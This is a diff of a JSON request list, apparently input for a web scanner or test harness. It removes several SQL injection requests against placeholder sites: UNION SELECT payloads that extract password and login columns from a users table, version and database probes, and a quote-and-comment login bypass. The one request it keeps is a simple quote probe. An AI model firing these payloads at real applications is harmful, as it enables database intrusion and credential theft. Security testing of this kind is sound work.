@@ -8,100 +8,15 @@
     }, 
     "url": "https://app5.com/www/student.php", 
     "param": {
-      "folder": "7%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20\u00ad\u00ad", 
+      "folder": "7%27%23", 
       "ctg": "messages"
+    }, 
+    "header": {
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
     "loginrequired": "true", 
     "loginurl": "https://app5.com/www/index.php?index_page", 
     "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "submit_login": "Login", 
-      "login": "student", 
-      "password": "student", 
-      "_qf__login_form": ""
-    }, 
-    "url": "https://app5.com/www/student.php", 
-    "param": {
-      "folder": "7%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5++", 
-      "ctg": "messages"
-    }, 
-    "loginrequired": "true", 
-    "loginurl": "https://app5.com/www/index.php?index_page", 
-    "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "submit_login": "Login", 
-      "login": "student", 
-      "password": "student", 
-      "_qf__login_form": ""
-    }, 
-    "url": "https://app5.com/www/student.php", 
-    "param": {
-      "folder": "7'#", 
-      "ctg": "messages"
-    }, 
-    "loginrequired": "true", 
-    "loginurl": "https://app5.com/www/index.php?index_page", 
-    "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "username": "admin@admin.com", 
-      "password": "admin", 
-      "dologin": "1"
-    }, 
-    "url": "https://app4.com/admin/status.php", 
-    "param": {
-      "status_id": "1%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20\u00ad\u00ad", 
-      "op": "edit"
-    }, 
-    "header": {}, 
-    "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
-    "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "username": "admin@admin.com", 
-      "password": "admin", 
-      "dologin": "1"
-    }, 
-    "url": "https://app4.com/admin/status.php", 
-    "param": {
-      "status_id": "1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5++", 
-      "op": "edit"
-    }, 
-    "header": {}, 
-    "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
-    "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "username": "admin@admin.com", 
-      "password": "admin", 
-      "dologin": "1"
-    }, 
-    "url": "https://app4.com/admin/status.php", 
-    "param": {
-      "status_id": "1'#", 
-      "op": "edit"
-    }, 
-    "header": {}, 
-    "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
-    "type": "GET"
-  }, 
-  {
-    "url": "https://app1.com/users/login.php", 
-    "type": "POST", 
-    "loginrequired": "false", 
-    "param": {
-      "username": "bob'#", 
-      "password": "1"
-    }
   }
 ]
